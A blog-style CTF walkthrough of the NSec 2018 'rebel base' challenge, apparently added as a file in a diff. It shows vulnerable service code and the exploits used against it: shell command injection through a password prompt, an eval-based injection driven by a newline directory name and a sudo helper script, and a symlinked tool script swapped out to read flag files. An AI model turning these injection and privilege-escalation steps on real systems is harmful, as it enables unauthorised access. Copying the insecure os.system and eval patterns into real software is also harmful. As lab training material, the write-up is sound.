@@ -1,0 +1,312 @@
+---
+title: "NSec 2018 - rebel base"
+layout: post
+date: 2018-08-05
+tag:
+- NSec2018
+- Linux
+- walktrhough
+- CTF
+category: blog
+author: Srbx7
+description: NSec 2018 CTF
+---
+
+# Connexion Configuration
+
+Ok, that one was pretty straight foward. The message arrived later during the CTF. It  was saying that ours connexion configuration had a problem. The only thing we had to do was to look in our `connexion configuration`? lol :)
+
+```bash
+vim /etc/resolv.conf
+```
+
+# Rebel Base Repair: http://xn--fn8h3kb.ctf/
+
+_index.html_
+```bash
+Service status
+Service Name 	Status
+
+camera-service 	DOWN
+clock-service 	DOWN
+management-service 	DOWN
+status-service 	DOWN
+tool-service 	DOWN
+remote-service 	DOWN
+
+Management credentials
+
+User : tech
+Password : fixmeplease
+```
+## Scannings
+
+```bash
+# dirs
+_tachyon http://xn--fn8h3kb.ctf/
+[21:36:23] [FOUND] *Forbidden* Icon directory at: http://xn--fn8h3kb.ctf/icons/
+
+#ip
+nmap -6 xn--fn8h3kb.ctf
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2018-05-18 21:51 EDT
+Nmap scan report for xn--fn8h3kb.ctf (9000:470:b2b5:cafe:216:3eff:fe50:a269)
+Host is up (0.0023s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 0.11 seconds
+```
+
+## Gaining Access:
+
+
+
+```bash
+sudo -l
+
+    (status-service) NOPASSWD: /opt/services/status-service/check-status.sh
+        (tool-service) NOPASSWD: /opt/tool-service/
+```
+#### __Management-Service__
+
+```bash
+vim /opt/services/management-service/manage.py
+```
+
+
+```python
+#manage.py: /opt/services/management-service/manage.py
+import os
+import sys
+import httplib
+
+def print_menu():
+        print "######################"
+        print "# Management console #"
+        print "######################"
+        print ""
+        print "Type '?' or 'help' for help."
+
+def get_option():
+        sys.stdout.write("> ")
+        invalue = sys.stdin.readline()
+        return invalue.replace("\r", "").replace("\n", "")
+
+def menu_loop():
+        while True:
+                print_menu()
+                opt = get_option()
+
+                if not opt in MENU_OPTIONS:
+                        print "Invalid option"
+                        continue
+
+                MENU_OPTIONS[opt]()
+
+def change_master():
+        print "Enter the new master password : "
+        password = get_option()
+
+        if len(password) > 20:
+                print "Password must be at most 20 characters"
+                return
+
+        # Prevents command injection
+        password = password.replace("'", "")
+        os.system('fakechroot -s fakeroot /usr/sbin/chroot /opt/services/management-service/ /bin/bash -c \'/bin/echo "' + password + '" > /master.txt\'')
+        print "Password changed !"
+
+def ping_website():
+        print "Enter the domain to test : "
+        domain = get_option()
+
+        try:
+                conn = httplib.HTTPConnection(domain)
+                conn.request("GET", "/")
+                conn.getresponse().read()
+                print "Website is UP !"
+        except Exception:
+                print "Website is DOWN !"
+
+def help_menu():
+        print "Options : "
+        print " help          : Show the help menu"
+        print " change-master : Change the master password of the management console"
+        print " ping-website  : Test website connectivity"
+        print " exit          : Exit the console"
+
+MENU_OPTIONS = {
+        "help" : help_menu,
+        "?" : help_menu,
+        "exit" : exit,
+        "change-master" : change_master,
+        "ping-website" : ping_website
+}
+
+menu_loop()
+```
+Great! Here's a concatenation that we can exploit easily! It comes from the `function change_master`.
+
+`
+os.system('fakechroot -s fakeroot /usr/sbin/chroot /opt/services/management-service/ /bin/bash -c \'/bin/echo "' + password + '" > /master.txt\'')``
+`
+```bash
+nc $URL 8787
+
+######################
+# Management console #
+######################
+
+Type '?' or 'help' for help.
+> change-master
+Enter the new master password : 
+> "; ls * "
+
+######################
+# Management console #
+######################
+
+Type '?' or 'help' for help.
+> change-master
+Enter the new master password : 
+> "; cat part1.flag "
+```
+
+```bash
+cat /opt/services/management-service/master.txt; 
+FLAG-3788fe305304d7eabf7e92e68e7ca430 #thanks @Robin ;)
+```
+
+We have the part1.flag. 
+
+Finaly, discovered that the part2.flag was NOT related to the second x-function of that service! The idea is that the `change_master() function` is using a `fakechroot`. Wich mean that it runs its own lib.c, BUT is still relative to the `tech's filesystem`
+
+#### status-service
+
+`cat /opt/services/status-service/check-status.sh`
+
+```bash
+#!/bin/bash
+if [ $# -eq 0 ]; then
+        echo "Usage check-status.sh [program-id]"
+        exit
+fi
+
+if [ -z "$1" ]; then
+        echo "Program ID must not be empty"
+        exit
+fi
+
+
+if [ ! -d "$path" ]; then
+        echo "Program ID is invalid"
+        exit
+fi
+
+status=$(eval "cat /opt/status/$1.txt")
+
+if [[ $status == *"DOWN"* ]]; then
+        echo "Service is DOWN"
+        exit
+fi
+
+if [[ $status == *"UP"* ]]; then
+        echo "Service is UP"
+        exit
+fi
+
+echo "Unknown service status"
+
+```
+
+Ok so the `var status` is what `eval` returns. Basically, `eval` simply runs every lines as different commands. So let's exploit this! ;)
+
+`status=$(eval "cat /opt/status/$1.txt")`
+###### Note:
+```bash
+eval 'echo woot1
+> echo woot2'
+woot1
+woot2
+
+# what we need's ish...
+eval "cat /opt/status/a_valid_dir
+> run_cmd > out
+> '
+```
+```bash
+cd /tmp/
+mkdir 'A
+ bash launch.sh > out
+'
+```
+__exploit.sh__
+```bash
+#!/bin/bash
+
+#Pass the command in argument...
+echo $1 > launch.sh
+sudo -u status-service /opt/services/status-service/check-status.sh '../../tmp/A
+bash launch.sh > out
+cat out
+```
+```bash
+bash exploit.sh 'cat /flags/status-service'
+FLAG-fa2b89295c01b89572bdce2bb5ada189 #thanks @Ced ! :)
+```
+
+#### tool-service
+
+```bash
+cat /opt/tool-service/tool
+
+#!/bin/bash
+python /home/tech/tools/tool.py
+
+
+cat /home/tech/tools/tool.py
+
+#!/bin/python
+from subprocess import call
+
+while True:
+  print "--------"
+  print "Menu"
+  print "--------"
+  print "1) Show hostname"
+  print "2) View open port"
+  print "3) Exit"
+
+  choice = raw_input("> ")
+
+  if "1" in choice:
+    call(["hostname"])
+  elif "2" in choice:
+    call(["netstat", "-ntpl"])
+  else:
+    break
+```
+
+Ok, there was a lot things in that script! All we had to do was to keep it simple baby!
+
+
+```bash
+ls -l /opt/services/tool-service/tool
+tool -> /home/tech/tools/tool.py
+mv ~/tools ~/tools_; mkdir ~/tools
+vim ~/tools/tool.py
+```
+```python
+#!/usr/bin/python
+
+from subprocess import call
+
+call["cat", "/flags/tool-service"]
+```
+```bash
+sudo -u tool-service /opt/tool-service/tool
+FLAG-54732c6b417bab535cd2d0086fd72f97 #thanks @srb_ ! :)
+```
